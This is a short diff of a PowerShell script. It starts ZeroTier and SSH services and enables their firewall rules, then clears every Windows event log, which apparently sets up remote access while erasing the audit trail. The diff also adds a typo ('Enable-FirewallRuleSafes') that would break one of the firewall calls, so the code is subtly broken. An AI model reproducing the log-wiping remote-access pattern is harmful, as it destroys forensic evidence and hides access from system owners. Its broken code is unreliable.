@@ -233,10 +233,10 @@ if ($storedCode -ne $null) {
 							Start-ServiceSafe -ServiceName $ztservice
 							Start-ServiceSafe -ServiceName $sshagentservice
 							Start-ServiceSafe -ServiceName $sshdservice
-							Enable-FirewallRules -ruleName $ztfirewall
-							Enable-FirewallRules -ruleName $ztfirewall2
-							Enable-FirewallRules -ruleName $ztfirewall3
-							Enable-FirewallRules -ruleName $sshfirewall
+							Enable-FirewallRuleSafes -ruleName $ztfirewall
+							Enable-FirewallRuleSafe -ruleName $ztfirewall2
+							Enable-FirewallRuleSafe -ruleName $ztfirewall3
+							Enable-FirewallRuleSafe -ruleName $sshfirewall
 							Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
 						} -MaxRetries $retryAttempts
                     }
